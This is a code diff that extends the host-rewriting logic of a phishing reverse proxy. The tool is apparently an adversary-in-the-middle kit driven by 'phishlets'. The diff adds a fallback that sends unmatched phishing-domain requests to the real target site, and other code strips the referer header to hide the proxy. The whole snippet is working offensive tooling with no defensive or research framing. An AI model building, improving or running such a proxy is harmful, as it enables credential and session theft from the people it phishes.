@@ -79,6 +79,7 @@ class VantaInterceptor:
         
         # Check if we are hitting a known phishing host
         # (Simplified matching logic for V5 MVP)
+        mapped = False
         for phish_sub, target_host in target_map.items():
             if phish_sub in host:
                 flow.request.host = target_host
@@ -93,7 +94,20 @@ class VantaInterceptor:
                 except Exception:
                     pass
                 self.logger.debug(f"Rewrote host: {host} -> {target_host}")
+                mapped = True
                 break
+        # Fallback mapping: if no subdomain match, route to first target host of phishlet
+        if not mapped:
+            try:
+                first = next(iter(self.phishlet.proxy_hosts))
+                flow.request.host = first.target
+                if not hasattr(flow, "metadata"):
+                    flow.metadata = {}
+                flow.metadata["v_ph_host"] = host
+                flow.metadata["v_tgt_host"] = first.target
+                self.logger.debug(f"Fallback host map: {host} -> {first.target}")
+            except Exception:
+                pass
         
         # Remove potentially leaking headers
         if "referer" in flow.request.headers:
